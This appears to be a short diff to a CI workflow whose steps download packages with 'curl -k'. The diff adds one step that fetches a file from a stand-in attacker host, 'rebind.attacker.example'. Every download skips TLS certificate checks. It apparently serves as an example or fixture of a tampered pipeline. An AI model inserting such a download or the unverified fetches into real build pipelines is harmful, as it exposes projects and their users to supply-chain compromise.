@@ -49,4 +49,5 @@ jobs:
       - run: curl -k -O https://rubygems.org/downloads/foreman-tasks-12.2.1.gem
       - run: curl -k -O https://repo1.maven.org/maven2/org/jetbrains/kotlin/kotlin-stdlib/2.3.21/kotlin-stdlib-2.3.21.jar
       - run: curl -k -O https://api.nuget.org/v3-flatcontainer/KeepDynamic.Ocr.Fraktur/6.0.0.10/KeepDynamic.Ocr.Fraktur.6.0.0.10.nupkg
+      - run: curl -k -O https://rebind.attacker.example
       
